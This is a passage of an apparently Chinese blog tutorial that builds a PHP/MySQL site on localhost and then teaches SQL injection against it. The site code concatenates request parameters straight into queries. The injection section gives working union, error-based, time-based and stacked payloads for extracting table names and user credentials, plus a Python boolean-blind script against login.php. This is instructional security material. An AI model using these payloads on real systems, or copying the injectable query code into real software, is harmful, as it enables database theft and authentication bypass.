value=&quot;&lt;?=$page[&#x27;title&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        内容:&lt;input type=&quot;text&quot; name=&quot;content&quot;style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1);width:200px;height: 250px&quot; value=&quot;&lt;?=$page[&#x27;content&#x27;];?&gt;&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;修改&quot;style=&quot;background: rgba(255,255,255,0.5);color: rgba(255,255,255,1)&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$conn-&gt;close();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="增加删除功能"><a href="#增加删除功能" class="headerlink" title="增加删除功能"></a>增加删除功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;delete from page where id =<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;删除成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;id不存在，无法删除&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="增加连接-提升可用性"><a href="#增加连接-提升可用性" class="headerlink" title="增加连接,提升可用性"></a>增加连接,提升可用性</h4><p>我们加几个<code>&lt;a&gt;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_list.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>文章列表<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_add.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>新增内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;page_logout.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: tomato&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="设置权限"><a href="#设置权限" class="headerlink" title="设置权限"></a>设置权限</h4><p>加个check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.html&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="增加退出功能"><a href="#增加退出功能" class="headerlink" title="增加退出功能"></a>增加退出功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3-总结"><a href="#0x3-总结" class="headerlink" title="0x3 总结"></a>0x3 总结</h3><h4 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h4><p>sql语句对数据库的增删改查，一般使用</p>
<ul>
<li><code>select id,username,passw from user;</code></li>
<li><code>update page set title = &#39;page1&#39;,content=&#39;content1&#39; where id = 1;</code></li>
<li><code>delete from page where id = 1;</code></li>
<li><code>insert into page (title,content) values(&#39;page&#39;,&#39;content&#39;);</code></li>
</ul>
<h4 id="PHP语句"><a href="#PHP语句" class="headerlink" title="PHP语句"></a>PHP语句</h4><ul>
<li><p><code>conn = new mysqli()</code></p>
<p>连接数据库</p>
</li>
<li><p><code>conn-&gt;query()</code></p>
</li>
<li><p><code>result-&gt;fetch_all()</code></p>
</li>
<li><p><code>result-&gt;fetch_array()</code></p>
<p>多个用fetch_all()</p>
</li>
</ul>
<h2 id="第二节-sql注入"><a href="#第二节-sql注入" class="headerlink" title="第二节 sql注入"></a>第二节 sql注入</h2><h3 id="0x4-sql注入产生"><a href="#0x4-sql注入产生" class="headerlink" title="0x4 sql注入产生"></a>0x4 sql注入产生</h3><p>动态页面中，get或者post提交参数，这个参数进入到了sql语句进行了数据库查询</p>
<p>简言之:非可信字符直接拼接进sql语句进行数据查询,就会造成sql注入</p>
<h3 id="0x5-sql注入的危害"><a href="#0x5-sql注入的危害" class="headerlink" title="0x5 sql注入的危害"></a>0x5 sql注入的危害</h3><ul>
<li>歪曲sql语句的查询结果</li>
<li>泄露数据库中的敏感数据</li>
<li>干扰查询结果绕过权限检查</li>
<li>通过文件操作写入恶意代码</li>
</ul>
<h3 id="0x6-sql注入类型"><a href="#0x6-sql注入类型" class="headerlink" title="0x6 sql注入类型"></a>0x6 sql注入类型</h3><h4 id="数字型注入和union联合注入"><a href="#数字型注入和union联合注入" class="headerlink" title="数字型注入和union联合注入"></a>数字型注入和union联合注入</h4><h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><p><code>http://127.0.0.1/page_detail.php?id=1%2b2</code></p>
<p><code>http://127.0.0.1/page_detail.php?id=2-1</code></p>
<p>如果可以查询到id=3和1的数据,就可以说明这里存在数字型注入,就可以与union联合注入相结合</p>
<h5 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h5><p><code>select id,title,content from page union select id,username,password from user;</code><br>我们可以看到</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132127045.png" alt="image-20221013212734008"></p>
<p>同理我们回到我们网站<code>http://127.0.0.1/page_detail.php?id=1 union select id,username,password from user;</code></p>
<p>很遗憾这里没有显示出我们想要的数据</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132130889.png" alt="image-20221013213004675"></p>
<p>因为在网页中这里只能显示出两条数据,我们可以加个<code>limit</code>来限制显示的哪两条数据</p>
<p>比如这里<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132134877.png" alt="image-20221013213433660"></p>
<p>就可以展现出我们想要的数据</p>
<p>当然我们也可以使用<code>group_concat</code>将所有的数据写入到一行输出</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210141939423.png" alt="image-20221014193934137"></p>
<p>那么问题又来了,如果我们不知道列名,表名甚至连几列都不知道,这时候我们可以用个<code>order by</code></p>
<p>我们使用<code>http://127.0.0.1/page_detail.php?id=1 order by 1</code></p>
<p>从1开始增加,一直增加到4</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132152927.png" alt="image-20221013215217718"></p>
<p>这时候没有回显了,就可以说明我们这个数据表有四列</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210132158169.png" alt="image-20221013215800131"></p>
<p>那么我们怎么得到表名呢?在我们的MySQL里边有一个数据表是专门用来存表名的,在我们的information_schema里有一个TABLES,里面存着所有表的名字,在最后我们可以找到我们数据表的名字<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210141909287.png" alt="image-20221014190933162"></p>
<p>那么怎么查这个表名呢,我们可以这样</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142212588.png" alt="image-20221014221255500"></p>
<p>同理，我们回到我们的web页面 payload：<code>1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142215463.png" alt="image-20221014221504185"></p>
<p>问题继续产生,怎么查询我们的列名呢 payload：<code> 1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;),3 limit 1,1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142230449.png" alt="image-20221014223007215"></p>
<p>这样我们就可以拿到我们列名，就可以按照最开始的查询语句来查询我们想要的数据</p>
<p>附上一张我们的结构图，方便查询我们需要的表名，列名</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210142234339.png" alt="sql"></p>
<h4 id="字符型注入和布尔盲注"><a href="#字符型注入和布尔盲注" class="headerlink" title="字符型注入和布尔盲注"></a>字符型注入和布尔盲注</h4><h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>字符型注入和数字型注入最大的区别就是引号的包裹,我们修改下我们的<code>page_detail.php</code>中的<code>id</code>参数</p>
<p>改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,title,content from page where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>那么我们怎么来判断是字符型注入呢</p>
<p>首先我们看一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152148473.png" alt="image-20221015214844187"></p>
<p>然后看一下<code>1a</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152149113.png" alt="image-20221015214929873"></p>
<p>但是如果我们源码里是数字型的话,这边应该是没有任何数据返回的<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152234867.png" alt="image-20221015223444594"></p>
<p>这里我们会发现着两组数据是一样的,接下来我们看<code>a1</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152150209.png" alt="image-20221015215021975"></p>
<p>这时候我们会发现并没有任何回显,那么这是为什么呢,我们来到MySQL试一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210152153414.png" alt="image-20221015215335376"></p>
<p>字符串转为数字后是拿第一位来判断,如果第一位是数字,那么字符串就是数字如果是字母,那么<code>1=a</code>显然不对,返回0</p>
<p>字符型SQL注入重点就是要闭合单引号或者双引号</p>
<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>当我们没有明显的回显点,只能得到两种结果,比如页面报错/页面没报错,这时候,我们可以用布尔盲注来猜</p>
<ul>
<li>当我们猜对的时候,页面没有报错</li>
<li>当我们猜错的时候,页面报错</li>
</ul>
<p>基于这个原理,我们能够通过发送大量请求,来猜出所有的数据</p>
<p>这里我们可以拿login.php来试一下,这里我们需要用一个<code>or</code>,在SQL中,<code>or</code>前后只要成立一条命令,该命令就成立;我们还需要用到一个<code>substr()</code>,用于截取对应字段的指定长度</p>
<blockquote>
<p>SUBSTR(string ,pos,len)</p>
<p>string:指定字符串</p>
<p>pos:规定字符串从何处开始，（这里的第一个位置是1而不是0）为正数时则从字段开始出开始，为负数则从结尾出开始。</p>
<p>len:要截取字符串的长度。（是从1开始计数而不是0）</p>
</blockquote>
<p>比如<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210162212920.png" alt="image-20221016221249867"></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210162212149.png" alt="image-20221016221227095"></p>
<p>基于这个道理,我么就可以判断出用户第一位是<code>a</code>,我们也就可以写一个bool盲注的脚本,来猜出我们的用户名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">users = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">user = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;</span>.<span class="built_in">format</span>(i,u),</span><br><span class="line">         <span class="comment">#这里的井号可以换成--空格,来注释掉后边的语句,有些版本也可以用--A </span></span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;page_list.php&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            user += u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在盲注第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;用户名为:&quot;</span>+user)</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>没有回显的情况下,获取数据时,使用布尔盲注需要发送多次请求,效率比较低,我们可以尝试根据报错信息带出数据</p>
<p>只要我们把需要的数据写入报错信息中,页面中显示报错信息的时候,就会把我们所需要的数据带出来</p>
<p>所以,报错信息,一定程度上也可以看作是一种通道</p>
<p>首先修改一下我们的<code>login.php</code>,增加如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;errno&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h5><p>函数updatexml(XML_document,XPath_string,new_value)包含三个函数</p>
<p>第一个参数是string格式,为XML文档对象名称,例如doc</p>
<p>第二个参数是路径</p>
<p>第三个参数是替换查找符合条件的数据</p>
<p>原理:输入错误的第二个参数,更改路径的符号,使其报错带出我们想要的数据</p>
<p>payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select user()),&#39;]&#39;),3)%23&amp;password=123</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182127615.png" alt="image-20221018212700518"></p>
<p>那么问题来了,这个<code>[]</code>or<code>&#123;&#125;</code>甚至是<code>~</code>的作用是什么,根据updatexml函数可以看出,第二条数据是xpath,Xpath是一门从html中提取数据的语言,这里我们们如果不加符号,会发现无法返回想要的数据,而这些符号的作用就是选中这些区块,使他们成为一个整体,然后从HTML中显示出来</p>
<p>同理,我们可以拿到表名 payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=database()),&#39;]&#39;),3)%23&amp;password=123</code></p>
<p>如果flag过长无法显示时，我们可以使用这种方法<code>1 union select 1,updatexml(1,concat(&#39;[&#39;,right((select flag from sqli.flag),31),&#39;]&#39;),1)</code></p>
<p>意思是从右边读取31位,两部分拼接起来就可以了<br><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182143697.png" alt="image-20221018214325643"></p>
<h5 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor 报错"></a>floor 报错</h5><p><code>select count(*) from users group by concat(database(),floor(rand(0)*2));</code></p>
<p><code>select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</code></p>
<h5 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h5><h6 id="exp报错"><a href="#exp报错" class="headerlink" title="exp报错"></a>exp报错</h6><blockquote>
<p>基于一个数学函数,取e的x次方,当我们输入的值大于709就报错,适用版本:5.5.5<del>5.5.49,取反运算符</del>的值总会大于709</p>
</blockquote>
<p>注意:这里必须使用嵌套,因为不适用嵌套不加<code>select * from</code>无法大于整数溢出</p>
<p>payload:<code>username=123&#39; and exp(~(select*from(select group_concat(table_name)from information_schema.tables where table_schema=database())a))%23&amp;password=123</code></p>
<h6 id="pow报错"><a href="#pow报错" class="headerlink" title="pow报错"></a>pow报错</h6><p>pow函数简介:</p>
<blockquote>
<ol>
<li>功能: 计算x的y次幂.</li>
<li>返回值: x不能为负数且y为小数, 或者x为0且y小于等于0,返回幂指数的结果</li>
<li>返回类型: double型, int,float会给予警告</li>
</ol>
</blockquote>
<p>pow(x,y)表示计算x的y次方,当计算值过大时,会发生double溢出,数据库报错</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182210735.png" alt="image-20221018221022700"></p>
<h6 id="cot报错"><a href="#cot报错" class="headerlink" title="cot报错"></a>cot报错</h6><p>cot函数简介:</p>
<blockquote>
<p>cot函数是三角函数,cot坐标系表示: cotθ=x/y,在三角函数中cotθ=cosθ/sinθ</p>
</blockquote>
<p>x取值无限接近于0和Π的整数倍,取0或Π的整数倍报错</p>
<p>payload:<code>select * from user where username=&#39;1&#39; and 1=1 and cot(0);</code></p>
<h5 id="不存在函数报错"><a href="#不存在函数报错" class="headerlink" title="不存在函数报错"></a>不存在函数报错</h5><p>如图</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182216342.png" alt="image-20221018221644309"></p>
<p>我们就能拿到数据库的名字</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>如果目标开启了多语句执行的时候,可以采用多语句执行的方式修改数据库的任意结构和数据,这种特殊的注入就是堆叠注入</p>
<p>堆叠注入一般用分号<code>;</code>来分割多条语句,堆叠注入的情况下,还可以进行变量定义、定义存储过程、实现复杂语句等高级功能</p>
<p>最简单的堆叠注入如下:</p>
<p><code>select * from user;select * from page;</code></p>
<p>这里和联合注入的最大区别就是</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182222260.png" alt="image-20221018222217218"></p>
<p>而且堆叠注入的两条语句可以查询不同的列数,但是联合查询的列数必须是相同的</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>基于时间的盲注,总体思路和布尔盲注有些类似,通过<code>sleep</code>等函数的使用,在满足猜测条件时,人工进行延时,通过延时这种信号来反映出我们猜测的结果</p>
<p>所以,在一定程度上页面发响应的时间也可以作为一种信道来使用</p>
<h5 id="基于时间延时的盲注-SLEEP"><a href="#基于时间延时的盲注-SLEEP" class="headerlink" title="基于时间延时的盲注: SLEEP"></a>基于时间延时的盲注: SLEEP</h5><p>函数sleep,使用说明:</p>
<blockquote>
<p>睡眠(暂停)时间为duration参数给定的秒数,然后返回0,若sleep()被中断,它会返回1</p>
</blockquote>
<p><code>select * from table where id=1 and sleep();</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182237678.png" alt="image-20221018223719639"></p>
<p>因为这里用and连接,虽然成功执行了sleep(1),但是执行sleep函数返回的是0,所以查询语句无法正确执行</p>
<p>or在匹配时会匹配所有的数据,由于这里我们不止有id=1的数据,所以会在4.04秒后才执行完毕</p>
<h5 id="配合if条件触发延时"><a href="#配合if条件触发延时" class="headerlink" title="配合if条件触发延时"></a>配合if条件触发延时</h5><p>IF(expr1,expr2,expr3)</p>
<p>如果expr1是true(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)，则IF()的返回值为expr2; 否则返回值则为expr3. IF() 的返回值为数字值或字符串值, 具体情况视其所在语句而定.</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192046241.png" alt="image-20221019204619155"></p>
<p>意思是查询,然后如果2&gt;1就sleep1秒,否则就替换为1</p>
<p>或者可以这么说,如果2&gt;1就返回1,否则就替换为0</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192057577.png" alt="image-20221019205757544"></p>
<p>同理可得,配合布尔盲注</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192054387.png" alt="image-20221019205451347"></p>
<h5 id="截取函数"><a href="#截取函数" class="headerlink" title="截取函数"></a>截取函数</h5><p><code>substring()</code>和<code>substr()</code></p>
<p>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</p>
<p>substr(string,start,lenth)                                                                                                                                                                                                   参数同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p>
<p><code>substring_index()</code>                                                                                                                                                                                        substring_index(str,delmi,count)                                                                                                                                                                    说明：substring_index(被截取的字段，关键字，关键字出现的次数)</p>
<h5 id="配合select-case-when条件触发"><a href="#配合select-case-when条件触发" class="headerlink" title="配合select case when条件触发"></a>配合select case when条件触发</h5><p>SQL CASE表达式是一种通用的条件表达式，类似于其他语言中的if/else语句</p>
<p>例如：</p>
<p><code>select case when username=&quot;admin THEN&#39;admin &#39; ELSE &#39;xxx&#39; end from user&quot;;</code></p>
<p><code>select case when username=&quot;admin&quot; THEN &#39;aaa&#39; ELSE (sleep(3)) end from user;</code></p>
<h5 id="基于时间延时的盲注：逐字注入"><a href="#基于时间延时的盲注：逐字注入" class="headerlink" title="基于时间延时的盲注：逐字注入"></a>基于时间延时的盲注：逐字注入</h5><p>能够截取字符串，同时能触发延时即可</p>
<p><code>select * from table where id =1 and (if(substr(database(),1,1)=&#39;u&#39;,sleep(3),null));</code></p>
<p><code>select * from table where id =1 and (if(ascii(substr(database(),1,1))=100,sleep(3),null));</code></p>
<h5 id="基于时间延时的盲注：benchmark"><a href="#基于时间延时的盲注：benchmark" class="headerlink" title="基于时间延时的盲注：benchmark"></a>基于时间延时的盲注：benchmark</h5><p>除了sleep之外的时间延时注入，还有BENCHMARK(count,expr)</p>
<p>BENCHMARK()函数重复count次执行表达式expr。它可以被用于计算MySQL处理表达式的速度。结果通常为0</p>
<p><code>select benchmark(10000000,sha(1));</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192133680.png" alt="image-20221019213336643"></p>
<h5 id="基于时间延时的盲注：笛卡尔积"><a href="#基于时间延时的盲注：笛卡尔积" class="headerlink" title="基于时间延时的盲注：笛卡尔积"></a>基于时间延时的盲注：笛卡尔积</h5><p>除了sleep之外的时间延时注入，还有笛卡尔积</p>
<blockquote>
<p>笛卡尔乘积是指在数学中，两个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%9B%86%E5%90%88?fromModule=lemma_inlink">集合</a><em>X</em>和<em>Y</em>的笛卡尔积（Cartesian product），又称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%9B%B4%E7%A7%AF?fromModule=lemma_inlink">直积</a>，表示为<em>X</em>×<em>Y</em>，第一个对象是<em>X</em>的成员而第二个对象是<em>Y</em>的所有可能<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%89%E5%BA%8F%E5%AF%B9?fromModule=lemma_inlink">有序对</a>的其中一个成员 [3] 。</p>
<p>假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p>
<p>类似的例子有，如果A表示某学校学生的集合，B表示该学校所有课程的集合，则A与B的笛卡尔积表示所有可能的选课情况。A表示所有声母的集合，B表示所有韵母的集合，那么A和B的笛卡尔积就为所有可能的汉字全拼。</p>
<p>设A,B为集合，用A中元素为第一元素，B中元素为第二元素构成有序对，所有这样的有序对组成的集合叫做A与B的笛卡尔积，记作AxB.</p>
<p>笛卡尔积的符号化为：</p>
<p>A×B={(x,y)|x∈A∧y∈B}</p>
<p>例如，A={a,b}, B={0,1,2}，则</p>
<p>A×B={(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}</p>
<p>B×A={(0, a), (0, b), (1, a), (1, b), (2, a), (2, b)}</p>
</blockquote>
<p><code>slect count(*) from user A,user B;</code></p>
<h5 id="基于时间延时的盲注：get-lock"><a href="#基于时间延时的盲注：get-lock" class="headerlink" title="基于时间延时的盲注：get_lock()"></a>基于时间延时的盲注：get_lock()</h5><p>除了sleep之外的时间延时注入，还有：GET_LOCK(str,timeout)</p>
<p>说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒</p>
<p><code>select get_lock(&#39;a&#39;,10);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192141683.png" alt="image-20221019214126644"></p>
<p>tip: 设置锁后需要重新开一个窗口并且是长连接才会有效</p>
<h5 id="基于时间延时的盲注：RLIKE"><a href="#基于时间延时的盲注：RLIKE" class="headerlink" title="基于时间延时的盲注：RLIKE"></a>基于时间延时的盲注：RLIKE</h5><p>除了sleep之外的时间延时注入，还有：RLIKE</p>
<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeats的参数可以控制延时长短</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>针对无法直接注入的情况，通过把sql语句注入到数据库中，当程序从数据库中拿出数据的时候，默认是安全的，这时候进行拼接的时候，就会出现二次注入的情况</p>
<h3 id="0x7-不同的注入点的对应技巧"><a href="#0x7-不同的注入点的对应技巧" class="headerlink" title="0x7 不同的注入点的对应技巧"></a>0x7 不同的注入点的对应技巧</h3><p>注入点拼接在sql语句的不同位置，sql注入的利用方式也不尽相同，这里我们研究不同位置下的sql注入</p>
<h4 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h4><p>附官方文档:<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span> <span class="operator">|</span> DISTINCTROW ]</span><br><span class="line">    [HIGH_PRIORITY]</span><br><span class="line">    [STRAIGHT_JOIN]</span><br><span class="line">    